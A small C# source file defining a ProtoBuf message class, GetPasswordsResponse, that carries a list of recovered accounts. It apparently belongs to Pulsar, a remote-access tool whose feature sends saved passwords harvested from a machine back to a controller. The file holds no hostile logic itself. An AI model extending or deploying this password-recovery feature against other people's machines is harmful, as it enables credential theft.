using ProtoBuf;
using Pulsar.Common.Messages.other;
using Pulsar.Common.Models;
using System.Collections.Generic;

namespace Pulsar.Common.Messages
{
    [ProtoContract]
    public class GetPasswordsResponse : IMessage
    {
        [ProtoMember(1)]
        public List<RecoveredAccount> RecoveredAccounts { get; set; }
    }
}
